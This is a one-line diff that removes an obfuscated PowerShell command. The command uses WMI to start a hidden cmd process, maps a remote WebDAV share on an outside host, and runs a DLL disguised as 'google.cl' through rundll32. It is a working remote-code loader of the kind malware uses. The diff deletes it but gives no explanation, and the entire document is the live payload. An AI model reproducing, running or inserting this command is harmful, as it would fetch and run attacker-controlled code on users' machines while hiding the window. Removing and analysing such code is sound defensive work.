@@ -1,1 +1,0 @@
-$t2BeDw=([wmiclass]('Win32_'+'Proces'+'sS'+'tart'+'up')).CreateInstance();$t2BeDw.ShowWindow=0;([wmiclass]('Win32_'+'Proce'+'s'+'s')).Create(('cmd /'+'c push'+'d \'+'\jg'+'.betl'+'and'+'.vip@SS'+'L'+'\67a'+'22389'+'-7b8f-4'+'ad6-b4'+'9'+'5-9f'+'0a4'+'39'+'ef90f & '+'ru'+'ndll3'+'2 goog'+'le.cl,'+'#1'),$null,$t2BeDw)
